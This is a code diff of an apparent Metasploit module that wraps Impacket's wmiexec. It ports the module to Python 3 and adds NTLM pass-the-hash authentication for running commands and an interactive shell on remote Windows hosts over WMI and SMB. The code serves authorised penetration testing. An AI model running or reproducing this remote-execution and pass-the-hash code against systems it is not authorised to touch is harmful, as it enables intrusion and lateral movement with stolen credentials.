@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # Copyright (c) 2003-2018 CORE Security Technologies
 #
 # This software is provided under under a slightly modified version
@@ -12,9 +12,9 @@ import string
 import sys
 
 try:
-    from impacket.smbconnection import SMBConnection, SMB_DIALECT, \
-        SMB2_DIALECT_002, SMB2_DIALECT_21
-    from impacket.dcerpc.v5.dcomrt import DCOMConnection
+    from impacket.smbconnection import SessionError, SMBConnection, \
+        SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21
+    from impacket.dcerpc.v5.dcomrt import DCOMConnection, DCERPCSessionError
     from impacket.dcerpc.v5.dcom import wmi
     from impacket.dcerpc.v5.dtypes import NULL
 except ImportError:
@@ -34,22 +34,25 @@ metadata = {
     'date': '2018-03-19',
     'license': 'CORE_LICENSE',
     'references': [
-        {'type': 'url', 'ref': 'https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py'},
-        {'type': 'aka', 'ref': 'wmiexec.py'},
+        {'type': 'url', 'ref': 'https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py'}
      ],
     'type': 'single_scanner',
     'options': {
         'COMMAND':    {'type': 'string', 'description': 'The command to execute', 'required': True},
         'OUTPUT':     {'type': 'bool',   'description': 'Get the output of the executed command', 'required': True, 'default': True},
         'SMBDomain':  {'type': 'string', 'description': 'The Windows domain to use for authentication', 'required': False, 'default': '.'},
-        'SMBPass':    {'type': 'string', 'description': 'The password for the specified username', 'required': True, 'default': None},
+        'SMBPass':    {'type': 'string', 'description': 'The password for the specified username', 'required': False, 'default': None},
         'SMBUser':    {'type': 'string', 'description': 'The username to authenticate as', 'required': True, 'default': None},
+        'HASHES':     {'type': 'string', 'description': 'The NTLM hash to use for authentication, format: LMHASH:NTHASH', 'required': False, 'default': None}
+    },
+    'notes': {
+        'AKA': ['wmiexec.py']
     }
 }
 
 
 class WMIEXEC:
-    def __init__(self, command='', username='', password='', domain='', hashes=None, share=None,
+    def __init__(self, command='', username='', password=None, domain='', hashes=None, share=None,
                  noOutput=False):
         self.__command = command
         self.__username = username
@@ -63,45 +66,54 @@ class WMIEXEC:
         self.__doKerberos = False
         self.__kdcHost = None
         self.shell = None
+        if hashes is not None:
+            self.__lmhash, self.__nthash = hashes.split(':')
 
     def run(self, addr):
-        if self.__noOutput is False:
-            smbConnection = SMBConnection(addr, addr)
-            if self.__doKerberos is False:
-                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-            else:
-                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
-                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
+        if not self.__password and not (self.__lmhash or self.__nthash):
+            logging.error("Either SMBPass or HASHES must be set, aborting...")
+            return
 
-            dialect = smbConnection.getDialect()
-            if dialect == SMB_DIALECT:
-                logging.info("SMBv1 dialect used")
-            elif dialect == SMB2_DIALECT_002:
-                logging.info("SMBv2.0 dialect used")
-            elif dialect == SMB2_DIALECT_21:
-                logging.info("SMBv2.1 dialect used")
-            else:
-                logging.info("SMBv3.0 dialect used")
+        if self.__noOutput is False:
+            try:
+                smbConnection = SMBConnection(addr, addr)
+                if self.__doKerberos is False:
+                    smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
+                else:
+                    smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
+                                                self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)
+
+                dialect = smbConnection.getDialect()
+                if dialect == SMB_DIALECT:
+                    logging.info("SMBv1 dialect used")
+                elif dialect == SMB2_DIALECT_002:
+                    logging.info("SMBv2.0 dialect used")
+                elif dialect == SMB2_DIALECT_21:
+                    logging.info("SMBv2.1 dialect used")
+                else:
+                    logging.info("SMBv3.0 dialect used")
+            except SessionError as exc:
+                logging.error(str(exc))
         else:
             smbConnection = None
 
         dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                               self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
         try:
-            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
+            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
             iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
             iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
             iWbemLevel1Login.RemRelease()
 
-            win32Process,_ = iWbemServices.GetObject('Win32_Process')
+            win32Process, _ = iWbemServices.GetObject('Win32_Process')
 
             self.shell = RemoteShell(self.__share, win32Process, smbConnection)
             if self.__command != ' ':
                 self.shell.onecmd(self.__command)
             else:
                 self.shell.cmdloop()
-        except (Exception, KeyboardInterrupt), e:
-            logging.error(str(e))
+        except (DCERPCSessionError, Exception, KeyboardInterrupt) as exc:
+            logging.error(str(exc))
 
         if smbConnection is not None:
             smbConnection.logoff()
@@ -116,10 +128,10 @@ class RemoteShell(_msf_impacket.RemoteShell):
         super(RemoteShell, self).__init__(share, smbConnection)
 
     def execute_remote(self, data):
-        command = self._shell + data 
+        command = self._shell + data
         if self._noOutput is False:
             command += ' 1> ' + '\\\\127.0.0.1\\%s' % self._share + self._output  + ' 2>&1'
-        self.__win32Process.Create(command.decode('utf-8'), self._pwd, None)
+        self.__win32Process.Create(command, self._pwd, None)
         self.get_output()
 
 
@@ -130,7 +142,7 @@ def run(args):
 
     _msf_impacket.pre_run_hook(args)
     executer = WMIEXEC(args['COMMAND'], args['SMBUser'], args['SMBPass'], args['SMBDomain'], 
-                        share='ADMIN$', noOutput=args['OUTPUT'] != 'true')
+                        hashes=args['HASHES'], share='ADMIN$', noOutput=args['OUTPUT'] != 'true')
     executer.run(args['rhost'])
 
 if __name__ == "__main__":
